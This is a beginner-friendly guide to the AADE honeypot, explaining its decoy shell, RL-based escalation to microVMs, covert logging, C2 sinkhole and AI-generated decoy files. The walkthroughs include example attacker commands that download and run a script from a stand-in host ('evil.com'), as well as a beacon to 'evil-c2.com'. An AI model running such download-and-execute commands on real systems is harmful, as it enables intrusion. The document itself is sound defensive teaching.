# AADE Honeypot — Beginner-Friendly Guide

## What is a Honeypot? (Simple Analogy)

Imagine you want to catch burglars. You build a **fake house** that looks completely real — furniture, TV, food in the fridge — but it's actually filled with hidden cameras and microphones. When a burglar breaks in, they think they've found a real home to rob. They look around, try to open safes, maybe call their friends to come help. Meanwhile, you watch everything they do, learn their techniques, and understand how they operate.

A **honeypot** is the cybersecurity version of that fake house. It's a fake computer system that hackers attack, thinking it's a real valuable server. While they're "inside," we watch and learn everything about them.

---

## The Problem with Old Honeypots

Traditional honeypots are like **cardboard movie sets** — they look real from the front, but if you walk around back, you see they're just wooden frames. Experienced hackers quickly figure out they're fake because:

| What's Wrong | Analogy | What Hackers Notice |
|-------------|---------|---------------------|
| Empty filesystem | House with no furniture, no family photos | `ls` command shows nothing |
| Fake kernel | House built on a soundstage floor | `uname` reveals it's emulated |
| No internet | House with phones that don't work | `wget` commands fail silently |
| Static responses | Robot butler that repeats same phrases | Every response is identical |

Once hackers realize it's fake, they leave immediately — and you learn nothing.

---

## How AADE is Different: The "Smart Fake House"

AADE is like a **smart fake house** with:
- **Real furniture and family photos** (LLM-generated realistic files and history)
- **Real foundation and walls** (actual Linux kernel, not emulated)
- **Working phones that secretly record calls** (internet that works but is monitored)
- **Smart security guard** who decides when to let thieves see more rooms (RL agent)

### The Two-Layer Trap

```
┌─────────────────────────────────────────────────────────────┐
│  OUTER LAYER: The "Decoy Room" (Cowrie)                    │
│  • Looks like a computer from the outside                  │
│  • SSH connection seems real                               │
│  • Basic commands work (ls, pwd, whoami)                   │
│  • Catches automated bots and simple hackers                 │
└─────────────────────────────────────────────────────────────┘
                           │
                           │ If someone does something serious
                           │ (downloads files, tries to install viruses)
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  SMART SECURITY GUARD (The RL Agent)                         │
│  Watches every command and decides:                        │
│  • "This is just a bot → Stay in decoy room"               │
│  • "This looks serious → Open the secret door"             │
│  • "Too dangerous → Kick them out"                         │
└─────────────────────────────────────────────────────────────┘
                           │
                           │ If serious
                           ▼
┌─────────────────────────────────────────────────────────────┐
│  INNER LAYER: The "Real-Looking House" (Firecracker VM)      │
│  • Actual Linux computer (not fake!)                       │
│  • Can create files, install things, run viruses             │
│  • But completely isolated and watched                         │
│  • Secret "spy channel" reports everything to us             │
└─────────────────────────────────────────────────────────────┘
```

---

## What Happens When a Hacker Attacks (Step-by-Step)

### Step 1: The Hacker Knocks on the Door
**What happens:** A hacker scans the internet for vulnerable computers and finds your AADE server. They try to connect via SSH (like knocking on the door and asking to come in).

**Behind the scenes:** They're actually talking to **Cowrie** — a program that pretends to be a computer. It lets them "log in" with any password.

```
Hacker: ssh root@honeypot-server
Cowrie: "Welcome! Password?"
Hacker: "password123"
Cowrie: "Access granted!" (It accepts ANY password)
```

---

### Step 2: They Look Around the Decoy Room
**What the hacker does:** They run basic commands to see what kind of computer this is.

```bash
whoami          → "root" (I'm the admin!)
id              → "uid=0(root) gid=0(root)"  
uname -a        → "Linux server-01 5.15.0..."
ls              → (sees some fake files)
```

**Behind the scenes:** 
- Every command is logged to a file called `cowrie.json`
- The **Orchestrator** (main controller) reads this file in real-time
- The **TTP Mapper** identifies: "This is 'System Information Discovery'"

**MITRE ATT&CK Explained:** Think of this as a "criminal playbook catalog." Security experts documented every technique hackers use and gave each one a code. When a hacker runs `whoami`, that's technique **T1033** (finding out who they are on the system).

---

### Step 3: The Security Guard Makes a Decision
**What happens:** The **RL Agent** (Reinforcement Learning Agent) — basically a smart security guard — evaluates the situation.

It looks at:
- How many commands has this person run? (3 commands = probably still looking around)
- What "techniques" have they used? (basic info gathering = low risk)
- How long have they been here? (30 seconds = just arrived)
- Overall risk score? (calculated from the above)

**The Decision:**
- **STAY (0)** → Keep them in the decoy room (Cowrie)
- **ESCALATE (1)** → Move them to the real-looking VM (Firecracker)
- **TERMINATE (2)** → Disconnect them (if too dangerous)

**Why this matters:** If we show the "real" computer to every automated bot, we'd have to start thousands of VMs. The guard filters out the noise and only gives real humans the "full experience."

---

### Step 4: The Secret Door Opens (Escalation)
**What triggers this:** The hacker does something serious — like trying to download a virus, checking sudo permissions, or installing a backdoor.

**Behind the scenes:**
```
Hacker types: wget http://evil.com/virus.sh

Orchestrator sees this:
  • Command: "wget http://evil.com/virus.sh"
  • Technique: T1105 (Ingress Tool Transfer)
  • Risk Score: 65/100 (HIGH!)
  
RL Agent decides: ESCALATE!

Action: Start Firecracker MicroVM
```

**What is Firecracker?** It's a technology from Amazon that creates tiny, fast virtual machines (micro-VMs). Think of it like instantly building a complete, isolated computer in under a second. This computer has:
- Its own real Linux kernel
- Its own memory and CPU
- A copy of the "gold image" (prepared fake filesystem)
- Complete isolation from the host system

---

### Step 5: The Hacker is Now in the "Real" House
**What the hacker experiences:** Nothing changes! Their SSH session continues seamlessly. They don't know they've been moved to a different computer. They think they're still on the same server.

**What they can now do:**
- Actually download files (but the internet is monitored)
- Install programs (they're really installed in the VM)
- Create user accounts (actually added to the VM)
- Run viruses (they run in isolation, can't hurt real systems)
- Delete logs (we're secretly keeping copies)

**Why this is brilliant:** They think they've successfully hacked a real server and now have full control. They're more likely to show their real techniques, download their actual malware toolkit, and reveal their entire playbook.

---

### Step 6: The Invisible Spy Reports Everything
**What is AF_VSOCK?** This is the "secret tunnel" that lets the VM talk to the host without using the network. Think of it like a phone line that:
- Only connects two specific rooms
- Doesn't appear on any phone bill
- Can't be tapped by anyone in the VM
- The hacker can't see it with any command

**The Spy Agent (logger_agent.py):** A tiny script inside the VM watches every command and reports:
```json
{
  "cmd": "wget http://evil.com/virus.sh",
  "user": "root",
  "cwd": "/root",
  "hostname": "prod-web-01",
  "exit_code": 0,
  "timestamp": "2026-04-14T10:00:05.123Z"
}
```

This goes through AF_VSOCK to the host, where the **VSOCK Listener** receives it.

---

### Step 7: The C2 Sinkhole Captures Malware Communications
**What is C2?** "Command and Control" — when malware phones home to its boss (the hacker's real server) to say "I'm here" and receive instructions.

**The Sinkhole (like a fake phone operator):**
- Malware in the VM tries to connect to `evil-server.com`
- Our **Honeywall** (iptables rules) redirects this to our fake server
- **Mitmproxy** pretends to be `evil-server.com`
- Malware sends: "I'm infected machine #12345, what should I do?"
- We reply: `{"status": "ok", "message": "beacon received"}`
- Malware thinks everything is working!

**Why fake 200 OK responses?** If we just block the connection, the malware realizes something is wrong and might:
- Delete itself (dead man's switch)
- Stop working
- Alert the hacker

By pretending to be the real C2 server, we keep the malware active and learning more about how it works.

---

### Step 8: You Watch Everything on the Dashboard
**The Dashboard shows:**
- Every command the hacker typed (in real-time)
- Which MITRE ATT&CK techniques they used (color-coded)
- The C2 servers they're trying to contact
- Whether they're in the "decoy room" or "real house"
- Charts showing their attack patterns

**Example view:**
```
[10:00:05] root@prod-web-01:/root$ wget http://evil.com/virus.sh  [T1105 - Ingress Tool Transfer]
[10:00:12] root@prod-web-01:/root$ chmod +x virus.sh              [T1222 - Permission Modification]
[10:00:15] root@prod-web-01:/root$ ./virus.sh &                   [T1059 - Command Execution]
[10:00:18] [C2 BEACON] POST http://evil-c2.com/register          [C2 Traffic Detected]
```

---

## The "Gold Image" — Making the House Look Lived-In

**The Problem:** If a hacker breaks into a computer and sees:
- Empty home directory
- No command history
- No SSH keys
- No installed programs

They immediately know it's a trap!

**AADE's Solution:** Before starting, we run `generate_noise.py` which creates a **"Gold Image"** — a fake computer that looks like a real, actively-used server:

### What the LLM (AI) Generates:

**1. Fake Bash History** — Commands that tell a story:
```bash
# Looks like a real developer was here!
cd /var/www/html
git pull origin main
sudo systemctl restart nginx
tail -f /var/log/nginx/error.log
vim config.py  # Edited database settings
python3 manage.py migrate
```

**2. Fake SSH Keys** — Real-looking key files:
```
~/.ssh/id_rsa          (the private key)
~/.ssh/id_rsa.pub      (the public key)
~/.ssh/known_hosts     (list of servers they've connected to)
~/.ssh/config          (SSH settings for different servers)
```

**3. Fake Cron Jobs** — Scheduled tasks:
```bash
# Looks like automated backups!
0 2 * * * /home/admin/backup.sh
*/5 * * * * /opt/monitoring/health_check.py
```

**4. Fake Project Files** — Realistic directories:
```
/home/developer/
├── myproject/
│   ├── app.py
│   ├── requirements.txt
│   ├── .env          (fake API keys!)
│   └── README.md
├── .gitconfig
└── .vimrc
```

**Why this works:** The AI creates **coherent stories** — not random files. If someone looks at the bash history, they see a narrative: "This is a web developer who deployed a Python app, had some nginx issues, fixed the database config..." It passes the "smell test."

---

## Key Technologies Explained Simply

| Technology | Simple Analogy | What It Does |
|------------|-----------------|--------------|
| **Cowrie** | Fake receptionist | Pretends to be a computer, answers SSH calls |
| **Firecracker** | Instant room builder | Creates real, isolated computers in milliseconds |
| **AF_VSOCK** | Secret tunnel | Hidden communication channel the hacker can't see |
| **MITMProxy** | Fake phone operator | Intercepts and records malware's phone calls home |
| **LLM (AI)** | Prop designer | Creates realistic fake documents and history |
| **RL Agent** | Smart security guard | Decides when to escalate vs. stay quiet |
| **TTP Mapper** | Criminal playbook reader | Identifies which hacking technique is being used |
| **Honeywall** | Security fence | Keeps the bad stuff contained, can't escape to real network |

---

## Why AADE is Special (Summary)

### Traditional Honeypot:
```
Hacker: "Let me check if this is real..."
        [runs detection commands]
        "This is fake! [disconnects]"
You: [learned nothing]
```

### AADE Honeypot:
```
Hacker: "Let me check if this is real..."
        [runs detection commands]
        "Looks legit! Let me download my tools..."
        [downloads virus toolkit]
        [installs backdoor]
        [sets up persistence]
        [tries to connect to C2]
You: [captured everything, mapped to MITRE ATT&CK, 
      identified C2 servers, analyzed malware, 
      learned their complete playbook]
```

---

## Real-World Attack Example

**Meet "Hacker_X":**

**10:00 AM** — Hacker_X scans the internet, finds your server (port 22 open).

**10:01 AM** — Tries common passwords, gets in (Cowrie accepts any password).

**10:02 AM** — Runs `whoami`, `id`, `uname -a` — basic recon. AADE logs these as T1033, T1082. Risk score: 15/100. **Decision:** STAY in Cowrie.

**10:05 AM** — Runs `cat /etc/passwd` looking for user accounts. AADE detects T1003 (Credential Dumping). Risk score: 35/100. **Decision:** STAY (still gathering intel).

**10:08 AM** — Downloads file: `wget http://evil.com/backdoor.sh`. **T1105 detected!** Risk score jumps to 65/100. **Decision:** ESCALATE!

**10:08:05 AM** — Firecracker MicroVM boots. Hacker_X's session seamlessly transfers. They don't notice.

**10:10 AM** — Hacker_X runs the backdoor. It tries to connect to `evil-c2.com:4444`. Honeywall redirects to mitmproxy. We capture the beacon and reply "OK." Hacker_X thinks backdoor is working.

**10:15 AM** — Hacker_X explores the filesystem, finds "company_secrets.tar.gz" (fake LLM-generated file), encrypts it with `gpg`. AADE logs this as T1486 (Ransomware behavior).

**10:20 AM** — Hacker_X installs a cron job for persistence. AADE logs T1053.003. Because this is in the MicroVM, it actually works — but we're watching.

**10:25 AM** — You check the dashboard. You see:
- Complete timeline of every command
- All 6 MITRE ATT&CK techniques mapped
- The C2 server address (IOC for blocking)
- The backdoor file (for analysis)
- Their persistence mechanism (how they'd return)

**Result:** You now understand this attacker's complete playbook and can defend against them and their associates.

---

## The Bottom Line

**AADE lets you:**
1. Catch hackers without them knowing
2. Learn their real techniques (not just what bots do)
3. Map everything to a standard security framework (MITRE ATT&CK)
4. Capture malware and C2 infrastructure information
5. Stay completely invisible while doing it

**The hacker thinks they've won. You've actually won.**

---

*AADE — The fake house that's smarter than the burglar.*
